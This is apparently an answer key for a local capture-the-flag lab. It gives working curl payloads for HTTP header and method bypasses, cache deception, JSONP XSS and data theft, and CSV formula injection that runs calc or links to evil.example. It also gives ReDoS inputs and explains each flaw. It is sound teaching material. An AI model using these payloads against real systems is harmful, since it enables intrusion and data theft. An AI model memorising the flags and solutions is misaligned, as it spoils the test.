# Batch 12 solutions - http, jsonp, formula, redos

Base URL used below: `http://localhost:3112` (adjust host/port to your run).
Flags from JavaScript/CSS/download endpoints are returned in the `X-Flag`
(or `X-Flags`) response header and saved to your scoreboard.

## http – HTTP Layer Flaws

**1. CRLF Log Injection** – `PENTRIX{http_crlf-log}`

1. Inject CR/LF bytes via the tracked ref parameter:
   `curl "http://localhost:3112/http/track?ref=homepage%0d%0a2026-10-02T00:00:00.000Z%20FAKE%20admin%20login%20from%2010.9.9.9"`
   The response page shows the flag.
2. Open `http://localhost:3112/http/admin/log` and confirm the forged
   `FAKE admin login` line appears as its own log entry.

Why it works: the raw ref value, CR/LF bytes included, is written to the
access log with no sanitization, so `%0d%0a` splits one entry into two, and
the log viewer renders the injected HTML raw.

**2. HTTP Method Override** – `PENTRIX{http_method-override}`

1. The inventory page (`/http/items`) only offers "request deletion" buttons
   that POST and delete nothing.
2. Bypass it with the override parameter:
   `curl -X POST --data "_method=DELETE" http://localhost:3112/http/items/2`
   The item is deleted and the flag is shown. Reload `/http/items` to confirm
   item #2 is gone (use `/http/items/reset` to restore the demo data).

Why it works: the app rewrites `req.method` from the `_method` body
parameter, so a plain POST is routed to the DELETE handler the UI never
exposes.

**3. Verb Tampering** – `PENTRIX{http_verb-tamper}`

1. The feedback form posts to `/http/feedback` and the page says POST-only.
2. Submit the same action as GET:
   `curl "http://localhost:3112/http/feedback?msg=hello"`
   The feedback is recorded and the flag is shown.

Why it works: the same handler is registered for both GET and POST, so the
"POST-only" endpoint performs its state change over GET too (bookmarkable,
loggable, CSRF-able).

**4. X-Forwarded-For Trust** – `PENTRIX{http_xff-admin}`

1. `curl http://localhost:3112/http/internal` returns 403.
2. Add the header yourself:
   `curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:3112/http/internal`
   The internal admin panel renders with the flag.

Why it works: admin access is granted from the client-controlled
`X-Forwarded-For` header, which any client can set to `127.0.0.1`.

**5. Cache Deception** – `PENTRIX{http_cache-deception}`

1. Purge the demo cache: open `http://localhost:3112/http/cache-purge`.
2. As the victim: open `http://localhost:3112/http/cache-login?user=alice`,
   then open `http://localhost:3112/http/account.css`. The response header
   says `X-Cache: MISS` and the CDN caches alice's personalized stylesheet.
3. As the attacker (fresh session: private window, or curl without the
   victim's cookie): `curl -i http://localhost:3112/http/account.css`
   You get `X-Cache: HIT`, the body still contains
   `ALICE-CDN-SECRET-9d2f`, and the `X-Flag` header carries the flag.

Why it works: the naive cache is keyed on the URL path only, so the victim's
personalized response (sent with `Cache-Control: public, max-age=3600`) is
served to every later visitor.

**6. Referer-Based Auth** – `PENTRIX{http_referer-auth}`

1. `curl http://localhost:3112/http/hidden` returns 403.
2. Send your own Referer:
   `curl -H "Referer: https://partner.example/trusted/page" http://localhost:3112/http/hidden`
   The partner portal renders with the flag.

Why it works: authorization checks the client-controlled `Referer` header for
the substring `/trusted`, which any client can supply.

## jsonp – JSONP Injection

**1. Callback XSS** – `PENTRIX{jsonp_callback-xss}`

1. `curl -i "http://localhost:3112/jsonp/user?callback=alert(1)//"`
2. The body is `alert(1)//({"user":"alice","role":"user"});` served as
   `application/javascript`, and the `X-Flag` header carries the flag.

Why it works: the callback name is reflected into executable JavaScript with
no validation, so it breaks out of the function-call context.

**2. JSONP Data Theft** – `PENTRIX{jsonp_csrf-data}`

1. While "logged in", visit `http://localhost:3112/jsonp/attacker` in the
   browser. The page's `<script src="/jsonp/data?callback=steal">` pulls the
   victim's JSONP feed (classic script tags ignore the Same-Origin Policy),
   then POSTs the data to `/jsonp/beacon`, which replies with the flag.
2. Manual equivalent:
   `curl -X POST -H "Content-Type: application/json" --data '{"user":"alice","secret":"ALICE-JSONP-SECRET-7f3a9c"}' http://localhost:3112/jsonp/beacon`

Why it works: sensitive data served as JSONP is readable cross-origin by any
site that can get the victim to load a script tag.

**3. Callback Filter Bypass** – `PENTRIX{jsonp_filter-bypass}`

1. `callback=alert(1)` is rejected with 400 (the word "alert" is blocked).
2. Rebuild it at runtime (URL-encoded):
   `curl -i "http://localhost:3112/jsonp/filtered?callback=x%3Btop%5B%27al%27%2B%27ert%27%5D%281%29%3B%2F%2F"`
   which decodes to `x;top['al'+'ert'](1);//`. The response executes it and
   the `X-Flag` header carries the flag.

Why it works: the blocklist only bans the literal word "alert", but string
concatenation rebuilds it at runtime where the filter never looks.

**4. Array Constructor Hijack** – `PENTRIX{jsonp_array-hijack}`

1. Visit `http://localhost:3112/jsonp/array-attacker` in the browser. The
   page saves the real `Array`, overrides the global constructor, loads
   `/jsonp/legacy?callback=gotFriends`, captures the elements, and beacons
   them to `/jsonp/array-beacon`, which replies with the flag.
2. Manual equivalent:
   `curl -X POST -H "Content-Type: application/json" --data '{"items":["alice:A1","bob:B2","carol:C3"]}' http://localhost:3112/jsonp/array-beacon`

Why it works: the legacy endpoint builds its JSONP with `new Array(...)`,
so a page that overrides the global `Array` constructor before loading the
feed intercepts every element (the classic 2007 hijack).

**5. JSONP MIME Sniffing** – `PENTRIX{jsonp_mimetype}`

1. `curl -i "http://localhost:3112/jsonp/snippet?callback=%3Cscript%3Ealert(1)%3C%2Fscript%3E"`
2. The response is `Content-Type: text/html` with
   `<script>alert(1)</script>({"note":"hello"});` in the body, and the
   `X-Flag` header carries the flag.

Why it works: JSONP served as `text/html` is parsed as a document, so HTML in
the callback executes when the URL is visited directly or framed.

## formula – CSV Formula Injection

Setup for all four: add a contact at `http://localhost:3112/formula/` (or via
curl), then download `http://localhost:3112/formula/export.csv`. The server
checks every exported cell; formula-trigger cells award the matching flag in
the `X-Flags` response header.

**1. Classic Formula Injection** – `PENTRIX{formula_formula-csv}`

`curl -X POST --data-urlencode "name==cmd|'/c calc'!A0" --data-urlencode "note=classic" http://localhost:3112/formula/add`
then `curl -i http://localhost:3112/formula/export.csv` shows the raw
`=cmd|'/c calc'!A0` cell and `X-Flags: PENTRIX{formula_formula-csv}`.

Why it works: cells are CSV-quoted but never neutralized, so a leading `=`
reaches the spreadsheet as a live formula.

**2. DDE Command Execution** – `PENTRIX{formula_formula-dde}`

`curl -X POST --data-urlencode 'name==DDE("cmd";"/c calc";"!A0")' http://localhost:3112/formula/add`
then export. Awards `PENTRIX{formula_formula-dde}`.

Why it works: the `=DDE(...)` function form survives quoting and asks an
external application to run the command when the sheet opens.

**3. HYPERLINK Exfiltration** – `PENTRIX{formula_formula-hyperlink}`

`curl -X POST --data-urlencode 'name==HYPERLINK("http://evil.example","click me")' http://localhost:3112/formula/add`
then export. Awards `PENTRIX{formula_formula-hyperlink}`.

Why it works: `HYPERLINK` renders an attacker URL behind an innocent label
and can be combined with cell references to leak neighboring data.

**4. Pipe Prefix (LibreOffice)** – `PENTRIX{formula_formula-pipe}`

`curl -X POST --data-urlencode 'name=|/usr/bin/xcalc' http://localhost:3112/formula/add`
then export. Awards `PENTRIX{formula_formula-pipe}`.

Why it works: the pipe-prefixed cell is LibreOffice's formula trigger
variant, and it reaches the export unsanitized like the rest.

## redos – ReDoS

Each endpoint reports the milliseconds the check took; past 1500 ms the flag
is awarded. Time with `time curl ...` or read the page. Length caps keep the
worst case in seconds.

**1. Catastrophic Email Regex** – `PENTRIX{redos_redos-email}`

`time curl "http://localhost:3112/redos/email?email=$(python3 -c "print('a'*30+'!'")"`
(30 a's followed by `!`, no `@` anywhere). Takes several seconds; the flag
is shown on the result page.

Why it works: the nested quantifier `((...+)+)` in the local part tries every
way to partition the 30-character run before failing on the missing `@`.

**2. Nested Quantifier Username** – `PENTRIX{redos_redos-username}`

`time curl "http://localhost:3112/redos/username?username=$(python3 -c "print('a'*27+'!'")"`
(27 a's followed by `!`). Takes several seconds; the flag is shown.

Why it works: the textbook catastrophic pattern `^(a+)+$` backtracks over
every partition of the a-run before the trailing `!` fails the match.

**3. Catastrophic URL Regex** – `PENTRIX{redos_redos-url}`

`time curl --get --data-urlencode "url=$(python3 -c "print('http://example.com/'+'a/'*12+'!'")"` http://localhost:3112/redos/url`
Takes several seconds; the flag is shown.

Why it works: the nested quantifiers `([\/\w .-]*)*` in the path group
explode when a long repeated path ends with a character the pattern rejects.

**4. Regex Injection Search** – `PENTRIX{redos_redos-search}`

`time curl "http://localhost:3112/redos/search?q=a"`
The query is compiled to `^((a)+)+$` and tested against a fixed haystack of
26 a's plus `!`. Takes several seconds; the flag is shown.

Why it works: the search query is interpolated as the repeated atom of the
template's nested quantifiers, so matching the haystack's character gives the
backtracking engine an exponential number of partitions to try.
